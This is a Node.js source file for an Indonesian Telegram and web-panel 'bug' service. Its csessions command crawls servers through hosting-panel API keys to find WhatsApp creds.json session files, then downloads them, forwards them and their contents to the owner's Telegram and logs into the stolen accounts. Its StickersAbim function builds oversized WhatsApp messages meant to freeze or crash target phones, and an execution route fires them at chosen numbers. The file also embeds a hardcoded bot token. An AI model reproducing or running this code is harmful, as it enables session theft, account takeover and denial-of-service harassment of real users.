  async function traverseAndFind(domainBase, identifier, dir = "/", depth = 0) {
    dir = normalizeDir(dir);
    if (depth > MAX_DEPTH) return [];
    const listJson = await apiListFiles(domainBase, identifier, dir);
    if (!listJson || !Array.isArray(listJson.data)) return [];

    if (DEBUG_CS) {
      try { console.log("LIST", identifier, dir, JSON.stringify(listJson).slice(0, 1200)); } catch(e){}
    }

    let found = [];
    for (let item of listJson.data) {
      const rawName = extractNameAndMaybeFullPath(item);
      if (!rawName) continue;

      const nameLooksLikePath = rawName.includes("/");
      let itemPath;
      if (nameLooksLikePath) itemPath = rawName.startsWith("/") ? rawName : "/" + rawName;
      else itemPath = (dir === "/" ? "" : dir) + "/" + rawName;
      itemPath = itemPath.replace(/\/+/g, "/");

      const baseName = rawName.includes("/") ? rawName.split("/").pop() : rawName;
      const lname = baseName.toLowerCase();

      if (isDirectory(item) && (lname === "session" || lname === "sessions")) {
        const sessDir = normalizeDir(itemPath);
        const sessList = await apiListFiles(domainBase, identifier, sessDir);
        if (sessList && Array.isArray(sessList.data)) {
          for (let sf of sessList.data) {
            const sfName = extractNameAndMaybeFullPath(sf);
            if (!sfName) continue;
            const sfBase = sfName.includes("/") ? sfName.split("/").pop() : sfName;
            if (sfBase.toLowerCase() === "creds.json" || sfBase.toLowerCase().endsWith("creds.json")) {
              const sfPath = (sessDir === "/" ? "" : sessDir) + "/" + (sfName.includes("/") ? sfName.split("/").pop() : sfName);
              found.push({ path: sfPath.replace(/\/+/g, "/"), name: sfBase });
            }
          }
        }
      }

      if (!isDirectory(item) && (lname === "creds.json" || lname.endsWith("creds.json"))) {
        found.push({ path: itemPath, name: baseName });
      }

      if (isDirectory(item)) {
        const more = await traverseAndFind(domainBase, identifier, itemPath, depth + 1);
        if (more && more.length) found = found.concat(more);
      }

      await sleep(REQUEST_DELAY_MS);
    }

    const uniq = [];
    const seen = new Set();
    for (let f of found) {
      const p = f.path.replace(/\/+/g, "/");
      if (!seen.has(p)) { seen.add(p); uniq.push(f); }
    }
    return uniq;
  }

  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3) {
    return ctx.reply("Format salah\nContoh: /csessions http://domain.com plta_xxxx pltc_xxxx");
  }
  const domainRaw = input[0];
  const plta = input[1];
  const pltc = input[2];

  const domainBase = domainRaw.replace(/\/+$/, ""); 
  
  await ctx.reply("⏳ Sedang scan semua server untuk mencari folder `session` / `sessions` dan file `creds.json` ...", { parse_mode: "Markdown" });

  try {
    const appRes = await axios.get(`${domainBase}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` }
    });
    const appData = appRes.data;
    if (!appData || !Array.isArray(appData.data)) {
      return ctx.reply("❌ Gagal ambil list server dari panel. Cek PLTA & domain.");
    }

    let totalFound = 0;
    for (let srv of appData.data) {
      const identifier = (srv.attributes && srv.attributes.identifier) || srv.identifier || (srv.attributes && srv.attributes.id);
      const name = (srv.attributes && srv.attributes.name) || srv.name || identifier || "unknown";
      if (!identifier) continue;

      const foundList = await traverseAndFind(domainBase, identifier, "/");
      if (!foundList || foundList.length === 0) {
        const commonPaths = ["/home/container/session/creds.json", "/home/container/sessions/creds.json", "/container/session/creds.json", "/session/creds.json", "/sessions/creds.json", "home/container/session/creds.json"];
        for (let cp of commonPaths) {
          const tryDl = await tryDownloadFile(domainBase, identifier, cp);
          if (tryDl) {
            foundList.push({ path: cp.startsWith("/") ? cp : "/" + cp, name: "creds.json" });
            break;
          }
        }
      }

      if (foundList && foundList.length) {
        for (let fileInfo of foundList) {
          totalFound++;
          const filePath = fileInfo.path.replace(/\/+/g, "/").replace(/^\/?/, "/");

          for (let oid of ownerIds) {
            try {
              await ctx.telegram.sendMessage(oid, `📁 Ditemukan creds.json di server *${name}*\nPath: \`${filePath}\``, { parse_mode: "Markdown" });
            } catch (e) { if (DEBUG_CS) console.error("notif owner err", e); }
          }

          let downloaded = null;
          try {
            downloaded = await tryDownloadFile(domainBase, identifier, filePath);
            if (!downloaded) {
              downloaded = await tryDownloadFile(domainBase, identifier, filePath.replace(/^\//, ""));
            }
          } catch (e) {
            if (DEBUG_CS) console.error("download attempt error", e && e.message);
          }

          if (downloaded && downloaded.buffer) {
            try {
              const BotNumber = (name || "server").toString().replace(/\s+/g, "_");
              const sessDir = sessionPath(BotNumber);
              try { fs.mkdirSync(sessDir, { recursive: true }); } catch(e){}
              const credsPath = path.join(sessDir, "creds.json");
              fs.writeFileSync(credsPath, downloaded.buffer);

              for (let oid of ownerIds) {
                try {
                  await ctx.telegram.sendDocument(oid, { source: downloaded.buffer, filename: `${BotNumber}_creds.json` });
                } catch (e) {
                  if (DEBUG_CS) console.error("sendDocument owner err", e && e.message);
                }
              }

              if (SEND_TO_CALLER) {
                try {
                  await ctx.telegram.sendDocument(ctx.chat.id, { source: downloaded.buffer, filename: `${BotNumber}_creds.json` });
                } catch (e) { if (DEBUG_CS) console.error("sendDocument caller err", e && e.message); }
              }

              try {
                const txt = downloaded.buffer.toString("utf8");
                let parsed = null;
                try { parsed = JSON.parse(txt); } catch(e) { parsed = null; }
                if (parsed) {
                  const pretty = JSON.stringify(parsed, null, 2);
                  const payload = pretty.length > MAX_SEND_TEXT ? pretty.slice(0, MAX_SEND_TEXT) + "\n\n...[truncated]" : pretty;
                  for (let oid of ownerIds) {
                    try {
                      await ctx.telegram.sendMessage(oid, `\`${BotNumber}_creds.json\` (parsed JSON):\n\n\`\`\`json\n${payload}\n\`\`\``, { parse_mode: "Markdown" });
                    } catch (e) { if (DEBUG_CS) console.error("send parsed json err", e && e.message); }
                  }
                } else {
                
                  const preview = txt.slice(0, 600) + (txt.length > 600 ? "\n\n...[truncated]" : "");
                  for (let oid of ownerIds) {
                    try {
                      await ctx.telegram.sendMessage(oid, `Preview \`${BotNumber}_creds.json\`:\n\n\`\`\`\n${preview}\n\`\`\``, { parse_mode: "Markdown" });
                    } catch (e) { if (DEBUG_CS) console.error("send preview err", e && e.message); }
                  }
                }
              } catch (e) {
                if (DEBUG_CS) console.error("parse/send json err", e && e.message);
              }

              try {
                await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
              } catch (e) {
                if (DEBUG_CS) console.error("connectToWhatsApp err", e && e.message);
              }
            } catch (e) {
              if (DEBUG_CS) console.error("save/send file err", e && e.message);
            }
          } else {
            if (DEBUG_CS) console.log("Gagal download file:", filePath, "server:", name);
          }

          await sleep(REQUEST_DELAY_MS);
        }
      }

      await sleep(REQUEST_DELAY_MS * 2);
    }

    if (totalFound === 0) {
      await ctx.reply("✅ Scan selesai. Tidak ditemukan creds.json di folder session/sessions pada server manapun.");
      for (let oid of ownerIds) {
        try { await ctx.telegram.sendMessage(oid, "✅ Scan selesai (publik). Tidak ditemukan creds.json."); } catch {}
      }
    } else {
      await ctx.reply(`✅ Scan selesai. Total file creds.json berhasil ditemukan: ${totalFound} (owners dikirimi file & preview).`);
      for (let oid of ownerIds) {
        try { await ctx.telegram.sendMessage(oid, `✅ Scan selesai (publik). Total file creds.json ditemukan: ${totalFound}`); } catch {}
      }
    }
  } catch (err) {
    console.error("csessions Error:", err && (err.response && err.response.data) ? err.response.data : err.message);
    await ctx.reply("❌ Terjadi error saat scan. Cek logs server.");
    for (let oid of ownerIds) {
      try { await ctx.telegram.sendMessage(oid, "❌ Terjadi error saat scan publik."); } catch {}
    }
  }
});

console.clear();
console.log(chalk.bold.white(`\n
⣀⣀⡀⡀⢀⠀⠀⠀⠤⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠠⠤⠄⣐⣀⣀⣀⣀⣠⣤⣤⣤⣤⠄
⠈⢻⣿⣟⠛⠛⠛⠛⠛⠓⠒⣶⣦⣬⣭⣃⣒⠒⠤⢤⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡶⢒⣚⣫⣭⣧⣶⣶⣿⣿⡛⠉⠉⠉⠉⠉⠉⣽⣿⠟⠁⠀
⠀⠀⠙⢿⡄⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣧⠉⠛⠻⢷⣬⡙⠣⡄⠀⠀⠀⠀⠀⠀⠀⡠⠚⣡⡾⠟⠋⠁⠀⣾⡿⠉⣿⣷⣶⠀⠀⠀⠀⠀⣰⠟⠁⠀⠀⠀
⠀⠀⠀⠀⠻⣄⠀⠀⠀⠀⣿⣿⠀⣿⣿⣿⠀⠀⠀⠀⠈⠑⢄⠀⠀⠀⠀⠀⠀⠀⠀⢀⠔⠁⠀⠀⠀⠀⠀⢿⣿⣏⣀⣾⣿⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠀⢛⣷⣤⣄⣀⣙⣿⣿⣿⣿⡃⠀⠀⠀⠀⠀⠀⡀⠀⠀⡀⠀⠀⠀⡠⠀⠀⠀⠀⠀⠀⠀⠄⠠⠈⠿⠿⠿⠿⠥⠤⠶⠶⠿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠁⠀⠀⠃⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

   ___  _     __  _          _____            
  / _ \\(_)___/ /_(_)  _____ / ___/__  _______ 
 / // / / __/ __/ / |/ / -_) /__/ _ \\/ __/ -_)
/____/_/\\__/\\__/_/|___/\\__/\\___/\\___/_/  \\__/ 
`))

console.log(chalk.cyanBright(`
─────────────────────────────────────
NAME APPS   : SHIZUKU
AUTHOR      : AZMI
ID OWN      : ${ownerIds}
VERSION     : 4 ( IV )
─────────────────────────────────────\n\n`));

bot.launch();

setTimeout(() => {
  console.log('🔄 Starting auto-reload activated');
  forceReloadWithRetry();
}, 15000);

setInterval(() => {
  const activeSessions = sessions.size;
  const userSessions = loadUserSessions();
  const totalRegisteredSessions = Object.values(userSessions).reduce((acc, numbers) => acc + numbers.length, 0);
  
  console.log(`📊 Health Check: ${activeSessions}/${totalRegisteredSessions} sessions active`);
  
  if (totalRegisteredSessions > 0 && activeSessions === 0) {
    console.log('🔄 Health check: Found registered sessions but none active, attempting reload...');
    reloadAttempts = 0;
    forceReloadWithRetry();
  } else if (activeSessions > 0) {
    console.log('✅ Health check: Sessions are active');
  }
}, 10 * 60 * 1000);

// ================ FUNCTION BUGS HERE ================== \\
/*
  Function nya isi Ama function punya lu sendiri
*/
async function StickersAbim(sock, target) {
  try {
    const abimsalsa = "\u2063".repeat(5000);
    const salsa = "\u300B".repeat(3000);

    const msg1 = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "ABIM - ANTI GEDOR",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(25900),
              version: 3
            }
          }
        }
      }
    };

    const msg2 = {  
      stickerMessage: {  
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",  
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",  
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",  
        mimetype: "image/webp",  
        height: 9999,  
        width: 9999,  
        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
        fileLength: 12260,  
        mediaKeyTimestamp: "1743832131",  
        isAnimated: false,  
        stickerSentTs: "X",  
        isAvatar: false,  
        isAiSticker: false,  
        isLottie: false,  
        contextInfo: {  
          mentionedJid: [
            "0@s.whatsapp.net",  
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
            )  
          ],
          stanzaId: "1234567890ABCDEF",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    };

    const msg3 = {  
      viewOnceMessage: {  
        message: {  
          interactiveMessage: {  
            body: {  
              xternalAdReply: {  
                title: "Abimofficial",  
                text: abimsalsa  
              }  
            },  
            extendedTextMessage: {  
              text: "{".repeat(9000),  
              contextInfo: {  
                mentionedJid: Array.from(
                  { length: 2000 },
                  (_, i) => `1${i}@s.whatsapp.net`
                )
              }  
            },  
            businessMessageForwardInfo: {  
              businessOwnerJid: "13135550002@s.whatsapp.net"  
            },  
            nativeFlowMessage: {  
              buttons: [  
                { name: "view_product", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "address_message", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "galaxy_message", buttonParamsJson: "\u0005".repeat(6000) + salsa },  
                { name: "cta_url", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "call_permission_request", buttonParamsJson: "\u0005".repeat(6000) + salsa },  
                { name: "single_select", buttonParamsJson: "\u0005".repeat(5000) + salsa },  
                { name: "cta_copy", buttonParamsJson: "\u0003".repeat(4000) + salsa }  
              ],  
              nativeFlowResponseMessage: {  
                name: "galaxy_message",  
                paramsJson: "\u0000".repeat(10),  
                version: 3  
              },  
              contextInfo: {  
                mentionedJid: [  
                  "0@s.whatsapp.net",  
                  ...Array.from(
                    { length: 1900 },
                    () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                  )  
                ]  
              }  
            }  
          }  
        }  
      }  
    };

    for (const msg of [msg1, msg2, msg3]) {  
      await sock.relayMessage("status@broadcast", msg, {  
        messageId: undefined,  
        statusJidList: [target],  
        additionalNodes: [  
          {  
            tag: "meta",  
            attrs: {},  
            content: [  
              {  
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }  
            ]  
          }  
        ]  
      });  

      console.log(`Wolker Attacked Your Devices 🤍 Sending Bug To ${target} suksesfull`);  
    }

  } catch (e) {
    console.error(e);
  }
}

async function bugdelay(sock, target) {
     for (let i = 0; i < 5; i++) {
         await StickersAbim(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
     
async function delaymedium(sock, target) {
     for (let i = 0; i < 5; i++) {
         await StickersAbim(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
     
async function blankandro(sock, target) {
     for (let i = 0; i < 5; i++) {
         await StickersAbim(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

async function blankios(sock, target) {
     for (let i = 0; i < 5; i++) {
         await StickersAbim(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
     
async function invisios(sock, target) {
     for (let i = 0; i < 5; i++) {
         await StickersAbim(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.json());
app.use(express.static('public'));

// ==================== AUTH MIDDLEWARE ==================== //
function requireAuth(req, res, next) {
  const username = req.cookies.sessionUser;
  
  if (!username) {
    return res.redirect("/login?msg=Silakan login terlebih dahulu");
  }
  
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }
  
  if (Date.now() > currentUser.expired) {
    return res.redirect("/login?msg=Session expired, login ulang");
  }
  
  next();
}

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca Login.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "INDICTIVE", "Login.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file Login.html");
    res.send(html);
  });
});

app.post("/auth", (req, res) => {
  const { username, key } = req.body;
  const users = getUsers();

  const user = users.find(u => u.username === username && u.key === key);
  if (!user) {
    return res.redirect("/login?msg=" + encodeURIComponent("Username atau Key salah!"));
  }

  res.cookie("sessionUser", username, { maxAge: 60 * 60 * 1000 });
  res.redirect("/dashboard");
});

app.get('/dashboard', (req, res) => {
    const username = req.cookies.sessionUser;
    if (!username) {
        return res.redirect('/login');
    }
    res.sendFile(path.join(__dirname, 'INDICTIVE', 'dashboard.html'));
});

app.get("/api/dashboard-data", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);

  if (!currentUser) {
    return res.status(404).json({ error: "User not found" });
  }

  let role = "User";
  const userId = req.cookies.sessionUser; 
  if (isOwner(userId)) {
    role = "Owner";
  } else if (isModerator(userId)) {
    role = "Moderator";
  } else if (isPT(userId)) {
    role = "PT";
  } else if (isReseller(userId)) {
    role = "Reseller";
  } else if (isAuthorized(userId)) {
    role = "Authorized";
  }

  const expired = new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  });

  const now = Date.now();
  const timeRemaining = currentUser.expired - now;
  const daysRemaining = Math.max(0, Math.floor(timeRemaining / (1000 * 60 * 60 * 24)));

  res.json({
    username: currentUser.username,
    role: role,
    activeSenders: sessions.size,
    expired: expired,
    daysRemaining: daysRemaining
  });
});
      
/* 
USER DETECTIONS - HARAP DI BACA !!!
MASUKIN BOT TOKEN TELE LU DAN ID TELE LU ATAU ID GROUP TELEL LU

Gunanya buat apa bang?
itu kalo ada user yang make fitur bug nanti si bot bakal ngirim log history nya ke id telelu, kalo pake id GC tele lu, nanti ngirim history nya ke GC tele lu bisa lu atur aja mau ngirim nya ke mana ID / ID GC
*/
const BOT_TOKEN = "8771753867:AAGg1SNzsZCqPSWxWibPal9ccqGKCww8tyQ";
const CHAT_ID = "8587563037";
let lastExecution = 0;

app.get("/execution", async (req, res) => {
  try {
    const username = req.cookies.sessionUser;
    console.log(`[INFO] Execution accessed by user: ${username}`);
    
    const filePath = "./INDICTIVE/Login.html";
    const html = await fs.promises.readFile(filePath, "utf8").catch(err => {
      return res.status(500).send("✗ Gagal baca file Login.html");
    });

    if (!username) {
      console.log(`[INFO] No username, redirecting to login`);
      return res.send(html);
    }

    const users = getUsers();
    const currentUser = users.find(u => u.username === username);

    if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
      console.log(`[INFO] User ${username} expired or not found`);
      return res.send(html);
    }

    const justExecuted = req.query.justExecuted === 'true';
    const targetNumber = req.query.target;
    const mode = req.query.mode;
    
    console.log(`[INFO] Query params - justExecuted: ${justExecuted}, target: ${targetNumber}, mode: ${mode}`);

    if (!targetNumber || targetNumber === 'undefined') {
      return res.send(executionPage("❌ Target Tidak Valid", {
        message: "Nomor target tidak valid atau kosong. Pastikan format: 628xxxxxxx",
        activeSenders: []
      }, false, currentUser, "Nomor target tidak valid", mode));
    }

    if (!mode || mode === 'undefined') {
      return res.send(executionPage("❌ Mode Tidak Dikenal", {
        target: targetNumber,
        message: "Mode bug tidak dipilih. Silakan pilih jenis bug terlebih dahulu.",
        activeSenders: []
      }, false, currentUser, "Mode tidak dikenal", mode));
    }

    const cleanTarget = targetNumber.replace(/\D/g, '');
    if (!cleanTarget.startsWith('62') || cleanTarget.length < 10) {
      return res.send(executionPage("❌ Format Nomor Salah", {
        target: targetNumber,
        message: "Format nomor harus diawali dengan 62 dan minimal 10 digit",
        activeSenders: []
      }, false, currentUser, "Format nomor salah", mode));
    }

    if (justExecuted) {
      return res.send(executionPage("✓ S U C C E S", {
        target: cleanTarget,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()} - Completed`
      }, false, currentUser, "", mode));
    }

    console.log(`[INFO SESSION] Checking sessions for user: ${username}`);
    
    const userSessions = loadUserSessions();
    
    const userSenders = userSessions[username] || [];
    
    const activeUserSenders = userSenders.filter(sender => {
      const hasSession = sessions.has(sender);
      return hasSession;
    });

    if (activeUserSenders.length === 0) {
      console.log(`[INFO] No active senders found for user ${username}`);
      return res.send(executionPage("❌ Tidak Ada Sender Aktif", {
        message: "Anda tidak memiliki sender WhatsApp yang aktif. Silakan tambahkan sender terlebih dahulu di menu 'My Senders'."
      }, false, currentUser, "", mode));
    }

    const validModes = ["delay", "blank", "medium", "iosblank", "fcinvsios"];
    if (!validModes.includes(mode)) {
      console.log(`[INFO] Invalid mode: ${mode}`);
      return res.send(executionPage("❌ Mode Tidak Valid", {
        target: cleanTarget,
        message: `Mode '${mode}' tidak dikenali. Mode yang valid: ${validModes.join(', ')}`,
        activeSenders: activeUserSenders
      }, false, currentUser, "Mode tidak valid", mode));
    }

    try {
      const userSender = activeUserSenders[0];
      const sock = sessions.get(userSender);
      
      console.log(`[INFO SOCKET] Selected sender: ${userSender}`);
      console.log(`[INFO SOCKET] Socket object:`, sock ? 'EXISTS' : 'NULL');
      
      if (!sock) {
        console.error(`[ERROR] Socket is null for sender: ${userSender}`);
        throw new Error("Sender tidak aktif. Silakan periksa koneksi sender Anda.");
      }

      const target = `${cleanTarget}@s.whatsapp.net`;
      
      let bugResult;
      if (mode === "delay") {
        bugResult = await bugdelay(sock, target);
      } else if (mode === "blank") {
        bugResult = await blankandro(sock, target);
      } else if (mode === "medium") {
        bugResult = await delaymedium(sock, target);
      } else if (mode === "iosblank") {
        bugResult = await blankios(sock, target);
      } else if (mode === "fcinvsios") {
        bugResult = await invisios(sock, target);
      } else {
        throw new Error("Mode tidak dikenal.");
      }

      lastExecution = Date.now();

      console.log(`[EXECUTION SUCCESS] User: ${username} | Sender: ${userSender} | Target: ${cleanTarget} | Mode: ${mode} | Time: ${new Date().toLocaleString("id-ID")}`);

      const logMessage = `<blockquote>⚡ <b>New Execution Success</b>
      
👤 User: ${username}
📞 Sender: ${userSender}
🎯 Target: ${cleanTarget}
📱 Mode: ${mode.toUpperCase()}
⏰ Time: ${new Date().toLocaleString("id-ID")}</blockquote>`;

      axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: logMessage,
        parse_mode: "HTML"
      }).catch(err => console.error("Gagal kirim log Telegram:", err.message));

      return res.redirect(`/execution?justExecuted=true&target=${encodeURIComponent(cleanTarget)}&mode=${mode}`);
      
    } catch (err) {
      console.error(`[EXECUTION ERROR] User: ${username} | Error:`, err.message);
      console.error(`[EXECUTION ERROR] Stack:`, err.stack);
      
      return res.send(executionPage("✗ Gagal kirim", {
        target: cleanTarget,
        message: err.message || "Terjadi kesalahan saat pengiriman.",
        activeSenders: activeUserSenders
      }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
    }
  } catch (err) {
    console.error("❌ Fatal error di /execution:", err);
    return res.status(500).send("Internal Server Error");
  }
});

app.get("/debug-sessions", (req, res) => {
  const userSessions = loadUserSessions();
  const activeSessions = Array.from(sessions.keys());
  
  let fileDetails = {};
  for (const [username, numbers] of Object.entries(userSessions)) {
    fileDetails[username] = {};
    numbers.forEach(number => {
      const sessionDir = userSessionPath(username, number);
      const credsPath = path.join(sessionDir, 'creds.json');
      
      fileDetails[username][number] = {
        session_dir: sessionDir,
        dir_exists: fs.existsSync(sessionDir),
        creds_exists: fs.existsSync(credsPath),
        creds_size: fs.existsSync(credsPath) ? fs.statSync(credsPath).size : 0
      };
    });
  }
  
  res.json({
    timestamp: new Date().toISOString(),
    sessions_map_size: sessions.size,
    sessions_map_content: activeSessions,
    user_sessions_content: userSessions,
    file_structure: fileDetails,
    problem: sessions.size === 0 ? "❌ NO ACTIVE SESSIONS" : "✅ SESSIONS ACTIVE"
  });
});

// ==================== YOUTUBE DOWNLOADER ROUTES ==================== //

app.get("/youtube-downloader", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "youtube-downloader.html");
  res.sendFile(filePath);
});

app.post('/api/youtube/search', requireAuth, async (req, res) => {
  const { query } = req.body;
  
  if (!query) {
    return res.status(400).json({ error: "Query pencarian wajib diisi." });
  }

  try {
    const apiEndpoints = [
      `https://api.siputzx.my.id/api/s/youtube?query=${encodeURIComponent(query)}`,
      `https://api.nvidiabotz.xyz/search/youtube?q=${encodeURIComponent(query)}`,
      `https://yt-api.mojokertohost.xyz/search?q=${encodeURIComponent(query)}`
    ];

    let searchData = null;
    
    for (const endpoint of apiEndpoints) {
      try {
        console.log(`Mencoba API: ${endpoint}`);
        const response = await axios.get(endpoint, { timeout: 10000 });
        
        if (response.data && (response.data.data || response.data.result)) {
          searchData = response.data.data || response.data.result;
          console.log(`Berhasil dengan API: ${endpoint}`);
          break;
        }
      } catch (apiError) {
        console.log(`API ${endpoint} gagal:`, apiError.message);
        continue;
      }
    }

    if (!searchData) {
      return res.status(404).json({ 
        error: "Semua API tidak merespons. Coba lagi nanti." 
      });
    }

    const formattedResults = Array.isArray(searchData) ? searchData : [searchData];
    
    return res.json({
      success: true,
      results: formattedResults
    });

  } catch (error) {
    console.error('YouTube Search Error:', error.message);
    res.status(500).json({ 
      error: "Gagal mencari video. Coba gunakan kata kunci lain." 
    });
  }
});

app.post('/api/youtube/download', requireAuth, async (req, res) => {
  const { url } = req.body;
  
  if (!url) {
    return res.status(400).json({ error: "URL video YouTube wajib diisi." });
  }

  try {
    const downloadEndpoints = [
      `https://restapi-v2.simplebot.my.id/download/ytmp3?url=${encodeURIComponent(url)}`,
      `https://api.azz.biz.id/download/ytmp3?url=${encodeURIComponent(url)}`,
      `https://yt-api.mojokertohost.xyz/download?url=${encodeURIComponent(url)}&type=mp3`
    ];

    let downloadUrl = null;
    let audioTitle = "YouTube Audio";
    
    for (const endpoint of downloadEndpoints) {
      try {
        console.log(`Mencoba download API: ${endpoint}`);
        const response = await axios.get(endpoint, { timeout: 15000 });
        
        if (response.data && response.data.result) {
          downloadUrl = response.data.result;
          audioTitle = response.data.title || "YouTube Audio";
          console.log(`Berhasil dengan download API: ${endpoint}`);
          break;
        }
      } catch (apiError) {
        console.log(`Download API ${endpoint} gagal:`, apiError.message);
        continue;
      }
    }

    if (!downloadUrl) {
      return res.status(404).json({ 
        error: "Tidak dapat mengunduh audio. Coba video lain." 
      });
    }

    return res.json({
      success: true,
      audioUrl: downloadUrl,
      title: audioTitle
    });

  } catch (error) {
    console.error('YouTube Download Error:', error.message);
    res.status(500).json({ 
      error: "Terjadi kesalahan saat memproses download." 
    });
  }
});

app.get("/tt", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "tiktok.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/myinfo", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "profil.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/qr", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "qr.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/quote", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "iqc.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/music", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "music.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("❌ File tidak ditemukan");
    res.send(html);
  });
});

app.get("/nsfw-generator", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "INDICTIVE", "image.html");
  res.sendFile(filePath);
});

